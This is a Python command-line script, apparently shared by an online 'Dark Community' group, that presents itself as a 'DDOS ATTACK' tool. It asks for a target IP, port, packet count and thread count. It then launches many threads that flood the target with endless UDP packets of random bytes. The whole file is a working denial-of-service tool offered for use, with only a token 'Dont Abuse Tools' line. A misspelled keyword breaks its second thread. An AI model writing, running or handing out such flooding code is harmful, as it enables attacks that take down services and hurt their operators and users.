import random
import socket
import threading
import os,sys

os.system("clear")
print("""
\033[1;96m  ____             
 |  _ \  __ _ _ __| | __                       
 | | | |/ _` | '__| |/ /____                   
 | |_| | (_| | |  |   <_____|                  
 |____/ \__,_|_|  |_|\_\           _ _         
  / ___|___  _ __ ___  _   _ _ __ (_) |_ _   _ 
 | |   / _ \| '_ ` _ \| | | | '_ \| | __| | | |
 | |__| (_) | | | | | | |_| | | | | | |_| |_| |
  \____\___/|_| |_| |_|\__,_|_| |_|_|\__|\__, |
                                         |___/ 
    TOOLS DDOS ATTACK
    Author : ! ZeeX#3072
    YouTube : Dark ZeeX
    Join Comunity Dark : https://discord.gg/y6FEe4nfc4
    Note : Dont Abuse Tools\033[0m
""")

ip = str(input("\033[92mDark DDOS | \033[93mHOST/IP ====> : \033[91m"))
port = int(input("\033[92mDark DDOS | \033[93mPORT ====> : \033[91m"))
times = int(input("\033[92mDark DDOS | \033[93mPAKET ====> : \033[91m"))
threads = int(input("\033[92mDark DDOS | \033[93mTHREAD ====> : \033[91m"))

def ddos():
    data = random._urandom(888)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(f"Dark Attack IP \033[1;96m{ip}:{port} \033[1;91mPaket Telah Terkirim")
        except:
            print(f"Dark Attack IP \033[1;96m{ip}:{port} \033[1;91mPaket Telah Terkirim")

def ddos2():
    data = random._urandom(150)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(f"Dark Attack IP \033[1;96m{ip}:{port} \033[1;91mPaket Telah Terkirim")
        except:
            print(f"Dark Attack IP \033[1;96m{ip}:{port} \033[1;91mPaket Telah Terkirim")

for y in range(threads):
    th = threading.Thread(target = ddos)
    th.start()
else:
    th = threading.Thread(taeget = ddos2)
    th.start()